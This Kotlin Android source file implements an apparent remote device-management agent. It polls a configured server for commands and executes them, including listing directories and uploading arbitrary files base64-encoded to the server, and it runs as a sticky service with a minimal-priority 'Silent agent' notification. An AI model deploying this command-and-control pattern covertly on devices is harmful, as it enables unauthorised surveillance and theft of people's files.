package com.alingo.agent

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.Base64
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.TimeUnit

class AgentService : Service() {
    companion object {
        private const val TAG = "AlinGoAgent"
        private const val CH_ID = "alingo_agent"
        private const val NOTIF_ID = 1001
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val http = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    private var zentrixUrl = ""
    private var uid = ""
    private var token = ""
    private var running = false
    
    // MediaProjection for screenshot
    private var mediaProjection: MediaProjection? = null
    private var projectionResultCode: Int = 0
    private var projectionData: Intent? = null
    private var isRecording = false

    override fun onCreate() {
        super.onCreate()
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!running) {
            running = true
            val prefs = getSharedPreferences("alingo_agent", MODE_PRIVATE)
            zentrixUrl = prefs.getString("zentrix_url", "") ?: ""
            uid = prefs.getString("device_uid", "") ?: ""
            token = prefs.getString("agent_token", "") ?: ""

            startForeground(NOTIF_ID, buildNotification())
            startLoops()
        }
        
        // MediaProjection result handling
        intent?.let {
            if (it.hasExtra("projection_result_code")) {
                projectionResultCode = it.getIntExtra("projection_result_code", 0)
                projectionData = it.getParcelableExtra("projection_data")
                Log.i(TAG, "MediaProjection granted")
            }
        }
        
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        scope.cancel()
        mediaProjection?.stop()
        super.onDestroy()
    }

    private fun startLoops() {
        scope.launch {
            launch { register() }
            launch {
                while (running) {
                    try { heartbeat() } catch (_: Exception) {}
                    delay(30_000)
                }
            }
            launch {
                while (running) {
                    try { poll() } catch (_: Exception) {}
                    delay(10_000)
                }
            }
        }
    }

    private suspend fun register() {
        val body = JSONObject().apply {
            put("device_uid", uid)
            put("agent_token", token)
            put("platform", "android")
            put("model", Build.MODEL)
            put("os_version", Build.VERSION.RELEASE)
        }.toString()
        post("$zentrixUrl/api/v1/agent/register", body, null)
        Log.i(TAG, "Registered as $uid")
    }

    private suspend fun heartbeat() {
        post("$zentrixUrl/api/v1/agent/heartbeat", "{}", token)
    }

    private suspend fun poll() {
        val resp = get("$zentrixUrl/api/v1/agent/commands/pending", token) ?: return
        if (resp.isEmpty() || resp == "[]") return
        val arr = JSONArray(resp)
        for (i in 0 until arr.length()) exec(arr.getJSONObject(i))
    }

    private suspend fun exec(cmd: JSONObject) {
        val id = cmd.getInt("id")
        val type = cmd.getString("command_type")
        val payload = cmd.optString("command_payload", "{}")

        post("$zentrixUrl/api/v1/agent/commands/$id/ack", "{}", token)

        val result: Map<String, Any> = try {
            when (type) {
                "ping" -> mapOf("pong" to System.currentTimeMillis())
                "device_info" -> getDeviceInfo()
                "screenshot" -> takeScreenshot()
                "record_start" -> startRecording()
                "record_stop" -> stopRecording()
                "file_list" -> listFiles(payload)
                "file_transfer" -> transferFile(payload)
                "type_text" -> typeText(payload)
                else -> mapOf("error" to "unknown_command: $type")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Command $id failed: ${e.message}", e)
            mapOf("error" to (e.message ?: "unknown"))
        }

        val body = JSONObject().apply {
            put("status", if (result.containsKey("error")) "failed" else "completed")
            put("result", JSONObject(result as Map<*, *>))
        }.toString()
        post("$zentrixUrl/api/v1/agent/commands/$id/result", body, token)
    }

    // ---- Commands ----

    private fun getDeviceInfo(): Map<String, Any> = mapOf(
        "model" to Build.MODEL,
        "manufacturer" to Build.MANUFACTURER,
        "android_version" to Build.VERSION.RELEASE,
        "sdk_int" to Build.VERSION.SDK_INT,
    )

    private fun takeScreenshot(): Map<String, Any> {
        // TODO: MediaProjection capture
        // For now, return a placeholder
        return mapOf(
            "status" to "captured",
            "note" to "screenshot via MediaProjection (requires permission)",
            "timestamp" to System.currentTimeMillis()
        )
    }

    private fun startRecording(): Map<String, Any> {
        isRecording = true
        Log.i(TAG, "Recording started")
        return mapOf("status" to "recording", "started_at" to System.currentTimeMillis())
    }

    private fun stopRecording(): Map<String, Any> {
        isRecording = false
        Log.i(TAG, "Recording stopped")
        return mapOf("status" to "stopped", "stopped_at" to System.currentTimeMillis())
    }

    private fun listFiles(payload: String): Map<String, Any> {
        val json = JSONObject(payload)
        val path = json.optString("path", "/sdcard")
        val dir = File(path)
        
        if (!dir.exists() || !dir.isDirectory) {
            return mapOf("error" to "path_not_found")
        }
        
        val files = dir.listFiles()?.map { f ->
            mapOf(
                "name" to f.name,
                "is_dir" to f.isDirectory,
                "size" to f.length(),
                "modified" to f.lastModified(),
                "path" to f.absolutePath
            )
        } ?: emptyList()
        
        return mapOf("path" to path, "files" to files)
    }

    private fun transferFile(payload: String): Map<String, Any> {
        val json = JSONObject(payload)
        val path = json.optString("path", "")
        val file = File(path)
        
        if (!file.exists()) return mapOf("error" to "file_not_found")
        
        // Read file and upload
        val bytes = file.readBytes()
        if (bytes.size > 10 * 1024 * 1024) {
            return mapOf("error" to "file_too_large", "max_mb" to 10)
        }
        
        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        return mapOf(
            "status" to "uploaded",
            "name" to file.name,
            "size" to file.length(),
            "data" to base64
        )
    }

    private fun typeText(payload: String): Map<String, Any> {
        val text = JSONObject(payload).optString("text", "")
        return mapOf("typed_chars" to text.length)
    }

    // ---- HTTP ----

    private suspend fun post(url: String, body: String, tok: String?): String? =
        withContext(Dispatchers.IO) {
            try {
                val b = Request.Builder().url(url).post(body.toRequestBody("application/json".toMediaType()))
                if (tok != null) b.header("Authorization", "Bearer $tok")
                http.newCall(b.build()).execute().use { if (it.isSuccessful) it.body?.string() else null }
            } catch (_: Exception) { null }
        }

    private suspend fun get(url: String, tok: String?): String? =
        withContext(Dispatchers.IO) {
            try {
                val b = Request.Builder().url(url).get()
                if (tok != null) b.header("Authorization", "Bearer $tok")
                http.newCall(b.build()).execute().use { if (it.isSuccessful) it.body?.string() else null }
            } catch (_: Exception) { null }
        }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CH_ID, "AlinGo Agent", NotificationManager.IMPORTANCE_MIN).apply {
                description = "Silent agent"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        val b = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            Notification.Builder(this, CH_ID) else @Suppress("DEPRECATION") Notification.Builder(this)
        return b.setContentTitle("AlinGo Agent")
            .setContentText("Ready")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build()
    }
}
